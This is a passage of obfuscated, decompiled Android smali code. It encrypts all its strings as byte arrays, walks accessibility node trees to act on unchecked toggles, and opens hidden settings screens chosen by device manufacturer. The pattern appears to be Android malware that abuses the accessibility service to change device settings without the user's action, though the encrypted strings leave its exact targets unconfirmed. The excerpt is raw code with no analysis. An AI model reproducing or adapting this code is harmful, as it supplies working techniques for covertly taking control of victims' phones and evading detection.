    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v3}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v1, v1, [B

    fill-array-data v1, :array_3

    invoke-static {v2, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    goto :goto_1

    :cond_1
    const/16 v0, 0x18

    new-array v0, v0, [B

    fill-array-data v0, :array_4

    new-array v6, v1, [B

    fill-array-data v6, :array_5

    invoke-static {v0, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_4

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v6

    if-ne v6, v5, :cond_2

    sput-boolean v5, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->k:Z

    :cond_2
    :goto_0
    if-ge v4, v6, :cond_4

    add-int/lit8 v5, v6, -0x1

    sub-int/2addr v5, v4

    invoke-interface {v0, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v7

    if-nez v7, :cond_3

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    if-eqz v5, :cond_3

    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    invoke-static {v5}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v3}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    sget-object v5, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v7, v2, [B

    fill-array-data v7, :array_6

    new-array v8, v1, [B

    fill-array-data v8, :array_7

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-static {v5, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v5

    invoke-static {v5}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    :cond_3
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    :cond_4
    :goto_1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->U2()V

    return-void

    :array_0
    .array-data 1
        0x7et
        -0x24t
        -0x23t
        0x2ct
        0x1bt
        0x56t
        -0x9t
        -0x3t
        0x6et
        -0x63t
        -0x2et
        0x63t
        0x0t
        0x52t
        -0x2t
        -0x6t
        0x64t
        -0x77t
        -0x27t
        0x66t
        0x5bt
        0x45t
        -0xct
        -0x3t
        0x74t
        -0x14t
        -0x3ct
        0x63t
        0x1dt
        0x4at
        -0x3ct
        -0x1bt
        0x7ct
        -0x3ft
        -0x25t
    .end array-data

    :array_1
    .array-data 1
        0x1dt
        -0x4dt
        -0x50t
        0x2t
        0x74t
        0x26t
        -0x65t
        -0x78t
    .end array-data

    :array_2
    .array-data 1
        0x7et
        0x3dt
        0x35t
        0x73t
        -0x32t
        0x70t
        -0x2et
        0x60t
        0x76t
        0x37t
        0x7et
        0x63t
        -0x2ct
        0x6dt
        -0x3et
        0x35t
        0x71t
        0x62t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x1ft
        0x53t
        0x51t
        0x1t
        -0x5ft
        0x19t
        -0x4at
        0x5at
    .end array-data

    :array_4
    .array-data 1
        0x41t
        0x13t
        -0x56t
        0x11t
        -0x8t
        -0x70t
        0x49t
        0x62t
        0x49t
        0x19t
        -0x1ft
        0x10t
        -0x20t
        -0x70t
        0x59t
        0x3bt
        0x48t
        0x22t
        -0x47t
        0xat
        -0xdt
        -0x62t
        0x48t
        0x2ct
    .end array-data

    :array_5
    .array-data 1
        0x20t
        0x7dt
        -0x32t
        0x63t
        -0x69t
        -0x7t
        0x2dt
        0x58t
    .end array-data

    :array_6
    .array-data 1
        -0xct
        -0x76t
        -0x39t
        0x75t
        0x45t
        0x3ft
        0x17t
        -0x7ft
        -0x4t
        -0x80t
        -0x74t
        0x65t
        0x5ft
        0x22t
        0x7t
        -0x2ct
        -0x5t
        -0x2bt
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x6bt
        -0x1ct
        -0x5dt
        0x7t
        0x2at
        0x56t
        0x73t
        -0x45t
    .end array-data
.end method

.method private static z1()V
    .locals 5

    .line 1
    const/4 v0, 0x0

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->o:Z

    const/4 v0, 0x1

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->b:Z

    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    if-nez v1, :cond_0

    return-void

    :cond_0
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/a7;->a()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x5

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    const/16 v1, 0x14

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v2, v3, [B

    fill-array-data v2, :array_3

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/16 v2, 0x41

    new-array v2, v2, [B

    fill-array-data v2, :array_4

    new-array v3, v3, [B

    fill-array-data v3, :array_5

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    :try_start_0
    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Landroid/content/ActivityNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :cond_1
    const/16 v1, 0x18

    new-array v1, v1, [B

    fill-array-data v1, :array_6

    new-array v2, v3, [B

    fill-array-data v2, :array_7

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/16 v2, 0x36

    new-array v2, v2, [B

    fill-array-data v2, :array_8

    new-array v3, v3, [B

    fill-array-data v3, :array_9

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    :catch_0
    :goto_0
    return-void

    :array_0
    .array-data 1
        0x4et
        0x68t
        -0x22t
        0x3dt
        0x65t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x26t
        0x7t
        -0x50t
        0x52t
        0x17t
        -0x15t
        0x53t
        -0x7ct
    .end array-data

    :array_2
    .array-data 1
        0x35t
        -0x8t
        0x67t
        -0x21t
        0x1at
        -0x16t
        -0x10t
        0x6ct
        0x39t
        -0x2t
        0x6et
        -0x21t
        0x8t
        -0x1ft
        -0x20t
        0x6at
        0x3ft
        -0x7t
        0x6dt
        -0x7et
    .end array-data

    :array_3
    .array-data 1
        0x56t
        -0x69t
        0xat
        -0xft
        0x7bt
        -0x7ct
        -0x6ct
        0x1et
    .end array-data

    :array_4
    .array-data 1
        -0x5ct
        -0x6ft
        0xdt
        0x62t
        0x2t
        -0x7at
        0x37t
        -0x1ct
        -0x58t
        -0x69t
        0x4t
        0x62t
        0x10t
        -0x73t
        0x27t
        -0x1et
        -0x52t
        -0x70t
        0x7t
        0x3ft
        0x4dt
        -0x45t
        0x36t
        -0x1et
        -0x4dt
        -0x69t
        0xet
        0x2bt
        0x10t
        -0x34t
        0x12t
        -0x1at
        -0x49t
        -0x41t
        0xet
        0x28t
        0x2dt
        -0x79t
        0x27t
        -0x1t
        -0x5ft
        -0x69t
        0x3t
        0x2dt
        0x17t
        -0x7ft
        0x3ct
        -0x8t
        -0x7dt
        -0x61t
        0x13t
        0x24t
        0x1t
        -0x79t
        0x32t
        -0x1ct
        -0x5dt
        -0x41t
        0x3t
        0x38t
        0xat
        -0x62t
        0x3at
        -0x1et
        -0x42t
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x39t
        -0x2t
        0x60t
        0x4ct
        0x63t
        -0x18t
        0x53t
        -0x6at
    .end array-data

    :array_6
    .array-data 1
        0x30t
        0xbt
        -0x9t
        0x56t
        0x20t
        0x3ct
        0x25t
        0x31t
        0x36t
        0xdt
        -0x4ct
        0xbt
        0x31t
        0x3at
        0x30t
        0x23t
        0x3et
        0x9t
        -0x5t
        0x16t
        0x29t
        0x2et
        0x21t
        0x34t
    .end array-data

    :array_7
    .array-data 1
        0x53t
        0x64t
        -0x66t
        0x78t
        0x48t
        0x49t
        0x44t
        0x46t
    .end array-data

    :array_8
    .array-data 1
        -0x5ft
        -0x71t
        0x7t
        -0x3dt
        0xdt
        -0x5at
        0xft
        -0x13t
        -0x59t
        -0x77t
        0x44t
        -0x62t
        0x1ct
        -0x60t
        0x1at
        -0x1t
        -0x51t
        -0x73t
        0xbt
        -0x7dt
        0x4t
        -0x4ct
        0xbt
        -0x18t
        -0x14t
        -0x73t
        0xbt
        -0x7ct
        0xbt
        -0x60t
        0xdt
        -0x18t
        -0x59t
        -0x7bt
        0x4t
        -0x3dt
        0x28t
        -0x4et
        0x7t
        -0xct
        -0x6ft
        -0x7dt
        0x18t
        -0x78t
        0x0t
        -0x43t
        0x2ft
        -0x7t
        -0x4at
        -0x77t
        0x1ct
        -0x7ct
        0x11t
        -0x56t
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x3et
        -0x20t
        0x6at
        -0x13t
        0x65t
        -0x2dt
        0x6et
        -0x66t
    .end array-data
.end method

.method private static synthetic z2(Landroid/content/Context;)V
    .locals 4

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->T2()V

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/vz;

    invoke-direct {v1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/vz;-><init>(Landroid/content/Context;)V

    const-wide/16 v2, 0x3e8

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method
